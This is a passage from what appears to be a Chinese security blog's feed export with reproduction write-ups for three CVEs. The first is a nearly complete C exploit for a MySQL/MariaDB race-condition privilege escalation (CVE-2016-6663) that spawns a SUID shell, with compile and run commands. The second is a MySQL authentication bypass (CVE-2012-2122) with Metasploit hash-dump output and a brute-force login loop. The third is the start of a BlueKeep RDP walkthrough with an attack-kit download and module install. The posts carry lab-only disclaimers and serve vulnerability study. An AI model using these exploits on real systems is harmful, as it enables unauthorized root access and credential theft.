</span><br><span class="line">        <span class="string">&quot;\033[94m\n&quot;</span></span><br><span class="line">        <span class="string">&quot;MySQL/Percona/MariaDB - Privilege Escalation / Race Condition PoC Exploit\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mysql-privesc-race.c (ver. 1.0)\n\n&quot;</span></span><br><span class="line">        <span class="string">&quot;CVE-2016-6663 / OCVE-2016-5616\n\n&quot;</span></span><br><span class="line">        <span class="string">&quot;For testing purposes only. Do no harm.\n\n&quot;</span></span><br><span class="line">	<span class="string">&quot;Discovered/Coded by:\n\n&quot;</span></span><br><span class="line">	<span class="string">&quot;Dawid Golunski \n&quot;</span></span><br><span class="line">	<span class="string">&quot;http://legalhackers.com&quot;</span></span><br><span class="line">        <span class="string">&quot;\033[0m\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">(<span class="keyword">char</span> *argv0)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">intro</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage:\n\n%s user pass db_host database\n\n&quot;</span>, argv0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mysql_cmd</span><span class="params">(<span class="keyword">char</span> *sql_cmd, <span class="keyword">int</span> silent)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!silent) &#123;</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">&quot;%s \n&quot;</span>, sql_cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">mysql_query</span>(conn, sql_cmd)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;%s\n&quot;</span>, <span class="built_in">mysql_error</span>(conn));</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    res = <span class="built_in">mysql_store_result</span>(conn);</span><br><span class="line">    <span class="keyword">if</span> (res&gt;<span class="number">0</span>) <span class="built_in">mysql_free_result</span>(res);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> randomnum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> io_notified = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> myd_handle;</span><br><span class="line">    <span class="keyword">int</span> wpid;</span><br><span class="line">    <span class="keyword">int</span> is_shell_suid=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="comment">/* io notify */</span></span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">4096</span>] __attribute__((<span class="built_in">aligned</span>(<span class="number">8</span>)));</span><br><span class="line">    <span class="keyword">int</span> num_read;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inotify_event</span> *<span class="title">event</span>;</span></span><br><span class="line">    <span class="comment">/* credentials */</span></span><br><span class="line">    <span class="keyword">char</span> *user     = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">char</span> *password = argv[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">char</span> *db_host  = argv[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">char</span> *database = argv[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Disable buffering of stdout</span></span><br><span class="line">    <span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get the params</span></span><br><span class="line">    <span class="keyword">if</span> (argc!=<span class="number">5</span>) &#123;</span><br><span class="line">	<span class="built_in">usage</span>(argv[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">intro</span>();</span><br><span class="line">    <span class="comment">// Show initial privileges</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[+] Starting the exploit as: \n&quot;</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;id&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Connect to the database server with provided credentials</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[+] Connecting to the database `%s` as %s@%s\n&quot;</span>, database, user, db_host);</span><br><span class="line">    conn = <span class="built_in">mysql_init</span>(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">mysql_real_connect</span>(conn, db_host, user, password, database, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;%s\n&quot;</span>, <span class="built_in">mysql_error</span>(conn));</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare tmp dir</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[+] Creating exploit temp directory %s\n&quot;</span>, <span class="string">&quot;/tmp/&quot;</span> EXP_DIRN);</span><br><span class="line">    <span class="built_in">umask</span>(<span class="number">000</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;rm -rf /tmp/&quot;</span> EXP_DIRN <span class="string">&quot; &amp;&amp; mkdir /tmp/&quot;</span> EXP_DIRN);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;chmod g+s /tmp/&quot;</span> EXP_DIRN );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare exploit tables :)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[+] Creating mysql tables \n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">mysql_cmd</span>(<span class="string">&quot;DROP TABLE IF EXISTS exploit_table&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">mysql_cmd</span>(<span class="string">&quot;DROP TABLE IF EXISTS mysql_suid_shell&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">mysql_cmd</span>(<span class="string">&quot;CREATE TABLE exploit_table (txt varchar(50)) engine = &#x27;MyISAM&#x27; data directory &#x27;&quot;</span> EXP_PATH <span class="string">&quot;&#x27;&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">mysql_cmd</span>(<span class="string">&quot;CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = &#x27;MyISAM&#x27; data directory &#x27;&quot;</span> EXP_PATH <span class="string">&quot;&#x27;&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy /bin/bash into the mysql_suid_shell.MYD mysql table file</span></span><br><span class="line">    <span class="comment">// The file should be owned by mysql:attacker thanks to the sticky bit on the table directory</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[+] Copying bash into the mysql_suid_shell table.\n    After the exploitation the following file/table will be assigned SUID and executable bits : \n&quot;</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;cp /bin/bash &quot;</span> SUID_SHELL);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;ls -l &quot;</span> SUID_SHELL);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use inotify to get the timing right</span></span><br><span class="line">    fd = <span class="built_in">inotify_init</span>();</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to inotify_init\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = <span class="built_in">inotify_add_watch</span>(fd, EXP_PATH, IN_CREATE | IN_CLOSE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Race loop until the mysql_suid_shell.MYD table file gets assigned SUID+exec perms */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[+] Entering the race loop... Hang in there...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ( is_shell_suid != <span class="number">1</span> ) &#123;</span><br><span class="line"></span><br><span class="line">        cnt++;</span><br><span class="line">	<span class="keyword">if</span> ( (cnt % <span class="number">100</span>) == <span class="number">0</span> ) &#123;</span><br><span class="line">	 	<span class="built_in">printf</span>(<span class="string">&quot;-&gt;&quot;</span>);</span><br><span class="line">	 	<span class="comment">//fflush(stdout);	</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Create empty file , remove if already exists */</span></span><br><span class="line">        <span class="built_in">unlink</span>(MYSQL_TEMP_FILE);</span><br><span class="line">        <span class="built_in">unlink</span>(MYSQL_TAB_FILE);</span><br><span class="line">   	<span class="built_in">mysql_cmd</span>(<span class="string">&quot;DROP TABLE IF EXISTS exploit_table&quot;</span>, <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">mysql_cmd</span>(<span class="string">&quot;CREATE TABLE exploit_table (txt varchar(50)) engine = &#x27;MyISAM&#x27; data directory &#x27;&quot;</span> EXP_PATH <span class="string">&quot;&#x27;&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* random num if needed */</span></span><br><span class="line">        <span class="built_in">srand</span> ( <span class="built_in">time</span>(<span class="literal">NULL</span>) );</span><br><span class="line">        randomnum = ( <span class="built_in">rand</span>() % MAX_DELAY );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Fork, to run the query asynchronously and have time to replace table file (MYD) with a symlink</span></span><br><span class="line">        pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Fork failed :(\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Child process - executes REPAIR TABLE  SQL statement */</span></span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">usleep</span>(<span class="number">500</span>);</span><br><span class="line">            <span class="built_in">unlink</span>(MYSQL_TEMP_FILE);</span><br><span class="line">	    <span class="built_in">mysql_cmd</span>(<span class="string">&quot;REPAIR TABLE exploit_table EXTENDED&quot;</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="comment">// child stops here</span></span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Parent process - aims to replace the temp .tmd table with a symlink before chmod */</span></span><br><span class="line">        <span class="keyword">if</span> (pid &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">            io_notified = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> processed = <span class="number">0</span>;</span><br><span class="line">                ret = <span class="built_in">read</span>(fd, buf, <span class="built_in"><span class="keyword">sizeof</span></span>(buf));</span><br><span class="line">                <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span> (processed &lt; ret) &#123;</span><br><span class="line">                    event = (struct inotify_event *)(buf + processed);</span><br><span class="line">                    <span class="keyword">if</span> (event-&gt;mask &amp; IN_CLOSE) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(event-&gt;name, <span class="string">&quot;exploit_table.TMD&quot;</span>)) &#123;</span><br><span class="line">                            <span class="comment">//usleep(randomnum);</span></span><br><span class="line"></span><br><span class="line">			    <span class="comment">// Set the .MYD permissions to suid+exec before they get copied to the .TMD file </span></span><br><span class="line">			    <span class="built_in">unlink</span>(MYSQL_TAB_FILE);</span><br><span class="line">			    myd_handle = <span class="built_in">open</span>(MYSQL_TAB_FILE, O_CREAT, <span class="number">0777</span>);</span><br><span class="line">			    <span class="built_in">close</span>(myd_handle);</span><br><span class="line">			    <span class="built_in">chmod</span>(MYSQL_TAB_FILE, <span class="number">04777</span>);</span><br><span class="line"></span><br><span class="line">			    <span class="comment">// Replace the temp .TMD file with a symlink to the target sh binary to get suid+exec</span></span><br><span class="line">                            <span class="built_in">unlink</span>(MYSQL_TEMP_FILE);</span><br><span class="line">                            <span class="built_in">symlink</span>(SUID_SHELL, MYSQL_TEMP_FILE);</span><br><span class="line">                            io_notified=<span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    processed += <span class="built_in"><span class="keyword">sizeof</span></span>(struct inotify_event);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (io_notified) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="built_in">waitpid</span>(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check if SUID bit was set at the end of this attempt</span></span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">lstat</span>(SUID_SHELL, &amp;st) == <span class="number">0</span> ) &#123;</span><br><span class="line">	    <span class="keyword">if</span> (st.st_mode &amp; S_ISUID) &#123;</span><br><span class="line">		is_shell_suid = <span class="number">1</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n[+] \033[94mBingo! Race won (took %lu tries) !\033[0m Check out the \033[94mmysql SUID shell\033[0m: \n\n&quot;</span>, cnt);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;ls -l &quot;</span> SUID_SHELL);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[+] Spawning the \033[94mmysql SUID shell\033[0m now... \n    Remember that from there you can gain \033[1;31mroot\033[0m with vuln \033[1;31mCVE-2016-6662\033[0m or \033[1;31mCVE-2016-6664\033[0m :)\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">system</span>(SUID_SHELL <span class="string">&quot; -p -i &quot;</span>);</span><br><span class="line">    <span class="comment">//system(SUID_SHELL &quot; -p -c &#x27;/bin/bash -i -p&#x27;&quot;);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* close MySQL connection and exit */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[+] Job done. Exiting\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">mysql_close</span>(conn);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译exp；</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient</span><br></pre></td></tr></table></figure>
+
+<p>执行 EXP 提权：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ./mysql-privesc-race 数据库用户名 密码 数据库地址 数据库</span></span><br><span class="line">./mysql-privesc-race <span class="built_in">test</span> 123456 localhost <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211104111549676.png" alt="image-20211104111549676"></p>
+]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>MySQL身份认证漏洞(CVE-2012-2122)</title>
+    <url>/2021/11/03/Mysql%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E6%BC%8F%E6%B4%9E(CVE-2012-2122)/</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
+<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
+<p>当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。 也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。按照公告说法大约256次就能够蒙对一次。</p>
+<ul>
+<li>参考：<a href="https://blog.csdn.net/weixin_41924764/article/details/113101932">https://blog.csdn.net/weixin_41924764/article/details/113101932</a></li>
+</ul>
+<hr>
+<span id="more"></span>
+
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
+<ul>
+<li>MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.</li>
+<li>MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.</li>
+</ul>
+<hr>
+<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>docker搭建；</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># cd /opt/docker/vulhub/mysql/CVE-2012-2122/</span></span><br><span class="line">[root@localhost CVE-2012-2122]<span class="comment"># docker-compose up -d</span></span><br><span class="line">Creating network <span class="string">&quot;cve-2012-2122_default&quot;</span> with the default driver</span><br><span class="line">Pulling mysql (vulhub/mysql:5.5.23)...</span><br><span class="line">5.5.23: Pulling from vulhub/mysql</span><br><span class="line">22dc81ace0ea: Pull complete</span><br><span class="line">1a8b3c87dba3: Pull complete</span><br><span class="line">91390a1c435a: Pull complete</span><br><span class="line">07844b14977e: Pull complete</span><br><span class="line">b78396653dae: Pull complete</span><br><span class="line">fe8cde33ebc9: Pull complete</span><br><span class="line">eb305569f43b: Pull complete</span><br><span class="line">Digest: sha256:5bbb7570f16526da1de61e84487daade5614eb2a9bfd28a87bcf4d6795b94463</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> vulhub/mysql:5.5.23</span><br><span class="line">Creating cve-2012-2122_mysql_1 ... <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">[root@localhost CVE-2012-2122]<span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID   IMAGE                 COMMAND                  CREATED         STATUS         PORTS                                       NAMES</span><br><span class="line">2365d270392c   vulhub/mysql:5.5.23   <span class="string">&quot;/bin/bash -c mysqld…&quot;</span>   5 minutes ago   Up 5 minutes   0.0.0.0:3306-&gt;3306/tcp, :::3306-&gt;3306/tcp   cve-2012-2122_mysql_1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>参考：<a href="https://blog.51cto.com/linuxgeek/998210">https://blog.51cto.com/linuxgeek/998210</a></p>
+<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>利用metasploit工具进行验证；</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfconsole </span></span><br><span class="line">/usr/share/metasploit-framework/modules/post/windows/mof_ps_persist.rb:38: warning: key <span class="string">&quot;Platform&quot;</span> is duplicated and overwritten on line 48</span><br><span class="line">[!] The following modules were loaded with warnings:</span><br><span class="line">[!] 	/usr/share/metasploit-framework/modules/post/windows/mof_ps_persist.rb</span><br><span class="line">[!] Please see /root/.msf4/logs/framework.log <span class="keyword">for</span> details.</span><br><span class="line">                                                  </span><br><span class="line">     ,           ,</span><br><span class="line">    /             \</span><br><span class="line">   ((__---,,,---__))</span><br><span class="line">      (_) O O (_)_________</span><br><span class="line">         \ _ /            |\</span><br><span class="line">          o_o \   M S F   | \</span><br><span class="line">               \   _____  |  *</span><br><span class="line">                |||   WW|||</span><br><span class="line">                |||     |||</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.99-dev                          ]</span><br><span class="line">+ -- --=[ 2045 exploits - 1106 auxiliary - 345 post       ]</span><br><span class="line">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: Use the edit <span class="built_in">command</span> to open the currently active module <span class="keyword">in</span> your editor</span><br><span class="line"></span><br><span class="line">[*] Starting persistent handler(s)...</span><br><span class="line">msf5 &gt; use auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br><span class="line">msf5 auxiliary(scanner/mysql/mysql_authbypass_hashdump) &gt; <span class="built_in">set</span> rhosts 192.168.220.132</span><br><span class="line">rhosts =&gt; 192.168.220.132</span><br><span class="line">msf5 auxiliary(scanner/mysql/mysql_authbypass_hashdump) &gt; run</span><br><span class="line">[+] 192.168.220.132:3306  - 192.168.220.132:3306 The server allows logins, proceeding with bypass <span class="built_in">test</span></span><br><span class="line">[*] 192.168.220.132:3306  - 192.168.220.132:3306 Authentication bypass is 10% complete</span><br><span class="line">[*] 192.168.220.132:3306  - 192.168.220.132:3306 Authentication bypass is 20% complete</span><br><span class="line">[*] 192.168.220.132:3306  - 192.168.220.132:3306 Authentication bypass is 30% complete</span><br><span class="line">[*] 192.168.220.132:3306  - 192.168.220.132:3306 Authentication bypass is 40% complete</span><br><span class="line">[*] 192.168.220.132:3306  - 192.168.220.132:3306 Authentication bypass is 50% complete</span><br><span class="line">[*] 192.168.220.132:3306  - 192.168.220.132:3306 Authentication bypass is 60% complete</span><br><span class="line">[+] 192.168.220.132:3306  - 192.168.220.132:3306 Successfully bypassed authentication after 612 attempts. URI: mysql://root:COXazJ@192.168.220.132:3306</span><br><span class="line">[+] 192.168.220.132:3306  - 192.168.220.132:3306 Successfully exploited the authentication bypass flaw, dumping hashes...</span><br><span class="line">[+] 192.168.220.132:3306  - 192.168.220.132:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9</span><br><span class="line">[+] 192.168.220.132:3306  - 192.168.220.132:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9</span><br><span class="line">[+] 192.168.220.132:3306  - 192.168.220.132:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9</span><br><span class="line">[+] 192.168.220.132:3306  - 192.168.220.132:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9</span><br><span class="line">[+] 192.168.220.132:3306  - 192.168.220.132:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9</span><br><span class="line">[+] 192.168.220.132:3306  - 192.168.220.132:3306 Hash Table has been saved: /root/.msf4/loot/20211103060402_default_192.168.220.132_mysql.hashes_563578.txt</span><br><span class="line">[*] 192.168.220.132:3306  - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211103180612192.png" alt="image-20211103180612192"></p>
+<p>存在此漏洞！</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>linux中执行：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 1000`; <span class="keyword">do</span> mysql -uroot -pwrong -h 192.168.220.132  ; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211103180812294.png" alt="image-20211103180812294"></p>
+<h2 id="漏洞加固"><a href="#漏洞加固" class="headerlink" title="漏洞加固"></a>漏洞加固</h2><ol>
+<li>升级官方补丁；</li>
+<li>更新MySQL。</li>
+</ol>
+]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>远程桌面服务远程执行代码漏洞(CVE-2019-0708)</title>
+    <url>/2021/11/05/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%9C%8D%E5%8A%A1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E(CVE-2019-0708)/</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
+<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
+<p>当未经身份验证的攻击者使用 RDP 连接到目标系统并发送经特殊设计的请求时，远程桌面服务（以前称为“终端服务”）中存在远程执行代码漏洞。此漏洞是预身份验证，无需用户交互。</p>
+<p>参考：<a href="https://www.hackliu.com/?p=468">https://www.hackliu.com/?p=468</a></p>
+<hr>
+<span id="more"></span>
+
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
+<p>Windows 7<br>Windows server 2008 R2<br>Windows server 2008<br>Windows 2003<br>Windows xp</p>
+<hr>
+<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>攻击机：kali 2021.1</p>
+<p>受害机：Windows 7</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="载入载荷"><a href="#载入载荷" class="headerlink" title="载入载荷"></a>载入载荷</h3><p>更新msf;</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install metasploit-framework</span><br></pre></td></tr></table></figure>
+
+<p>下载攻击套件;</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://gitee.com/cat-nineteen/tools/blob/master/tools/msftools/CVE-2019-0708RDP.zip</span><br></pre></td></tr></table></figure>
+
+<p>替换msf中相应的文件;</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb</span><br><span class="line">cp rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line">cp cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line">cp cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211105140429155.png" alt="image-20211105140429155"></p>
+<p>启动msf;</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动时报错信息如下：</span></span><br><span class="line">root@kali:/opt/tools/msftools/CVE-2019-0708RDP<span class="comment"># msfconsole </span></span><br><span class="line">Unable to find a spec satisfying metasploit-framework (&gt;= 0) <span class="keyword">in</span> the <span class="built_in">set</span>. Perhaps the lockfile is corrupted?</span><br><span class="line">Run `bundle install` to install missing gems.</span><br></pre></td></tr></table></figure>
+
+<p>使用reload_all加载payload文件；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reload_all</span><br></pre></td></tr></table></figure>
+
+<p>搜索2019_0708，可以看到文件成功加载；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search 2019_0708</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211105140914488.png" alt="image-20211105140914488"></p>
+<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>使用扫描模块（scanner）;</p>
